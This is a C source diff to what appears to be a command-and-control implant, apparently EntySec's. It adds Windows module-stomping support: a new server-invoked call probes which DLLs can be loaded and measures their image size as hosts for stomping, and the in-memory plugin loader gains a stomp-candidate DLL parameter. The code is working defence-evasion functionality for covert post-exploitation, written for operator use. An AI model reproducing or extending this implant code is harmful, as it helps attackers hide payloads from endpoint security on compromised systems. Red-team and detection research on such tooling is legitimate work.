@@ -1,7 +1,7 @@
 /*
  * MIT License
  *
- * Copyright (c) 2020-2024 EntySec
+ * Copyright (c) 2020-2026 EntySec
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -93,6 +93,11 @@
                        BUILTIN_BASE, \
                        API_CALL + 9)
 
+#define BUILTIN_PROBE_STOMP \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       BUILTIN_BASE, \
+                       API_CALL + 10)
+
 #define TLV_TYPE_PLATFORM  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE)
 #define TLV_TYPE_VERSION   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 1)
 #define TLV_TYPE_ARCH      TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 2)
@@ -155,6 +160,7 @@ static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
     /* Load TAB (The Additional Bundle) from memory location.
      *
      * :in bytes(TLV_TYPE_TAB): buffer containing TAB executable
+     * :in string(TLV_TYPE_FILENAME): stomp candidate DLL name (COT only, optional)
      * :out u32(TLV_TYPE_TAB_ID): loaded TAB ID
      * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
      *
@@ -163,13 +169,23 @@ static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
     core_t *core;
     int tab_size;
     unsigned char *tab;
+    char candidate[128];
+    char *cand_ptr;
     tlv_pkt_t *result;
 
     core = c2->data;
 
+    /* Stomp candidate name — sent by the server for COT plugins.
+     * For legacy DLL tabs this field is absent and ignored. */
+    cand_ptr = NULL;
+    if (tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, candidate) > 0)
+    {
+        cand_ptr = candidate;
+    }
+
     if ((tab_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_TAB, &tab)) > 0)
     {
-        if (tabs_add(&core->tabs, core->t_count, NULL, tab, tab_size, c2) == 0)
+        if (tabs_add(&core->tabs, core->t_count, cand_ptr, tab, tab_size, c2) == 0)
         {
             result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
             tlv_pkt_add_u32(result, TLV_TYPE_TAB_ID, core->t_count);
@@ -566,6 +582,72 @@ fail:
     return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
 }
 
+#ifdef __windows__
+static tlv_pkt_t *builtin_probe_stomp(c2_t *c2)
+{
+    /* Probe which DLLs from a candidate list exist on this system
+     * and are suitable for module stomping.
+     *
+     * :in  string(TLV_TYPE_STRING): newline-delimited candidate DLL names
+     * :out group(TLV_TYPE_GROUP)*:  one per valid candidate, each containing:
+     *        string(TLV_TYPE_STRING) — DLL name
+     *        u32(TLV_TYPE_INT)       — SizeOfImage
+     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
+     */
+
+    char input[4096];
+    char *line;
+    char *saveptr;
+    tlv_pkt_t *result;
+    tlv_pkt_t *entry;
+
+    if (tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, input) <= 0)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
+
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+
+    for (line = strtok_r(input, "\n", &saveptr);
+         line != NULL;
+         line = strtok_r(NULL, "\n", &saveptr))
+    {
+        HMODULE hMod;
+        PIMAGE_DOS_HEADER dos;
+        PIMAGE_NT_HEADERS nt;
+        SIZE_T img_size;
+
+        /* Skip leading whitespace / CR */
+        while (*line == ' ' || *line == '\r')
+            line++;
+        if (*line == '\0')
+            continue;
+
+        /* If already loaded, skip — pages are in use */
+        if (GetModuleHandleA(line) != NULL)
+            continue;
+
+        hMod = LoadLibraryA(line);
+        if (hMod == NULL)
+            continue;
+
+        dos = (PIMAGE_DOS_HEADER)hMod;
+        nt  = (PIMAGE_NT_HEADERS)((BYTE *)hMod + dos->e_lfanew);
+        img_size = nt->OptionalHeader.SizeOfImage;
+
+        FreeLibrary(hMod);
+
+        entry = tlv_pkt_create();
+        tlv_pkt_add_string(entry, TLV_TYPE_STRING, line);
+        tlv_pkt_add_u32(entry, TLV_TYPE_INT, (int32_t)img_size);
+        tlv_pkt_add_tlv(result, TLV_TYPE_GROUP, entry);
+        tlv_pkt_destroy(entry);
+    }
+
+    return result;
+}
+#endif
+
 void register_builtin_api_calls(api_calls_t **api_calls)
 {
     api_call_register(api_calls, BUILTIN_QUIT, builtin_quit);
@@ -578,6 +660,9 @@ void register_builtin_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, BUILTIN_UUID, builtin_uuid);
     api_call_register(api_calls, BUILTIN_SECURE, builtin_secure);
     api_call_register(api_calls, BUILTIN_UNSECURE, builtin_unsecure);
+#ifdef __windows__
+    api_call_register(api_calls, BUILTIN_PROBE_STOMP, builtin_probe_stomp);
+#endif
 }
 
 #endif
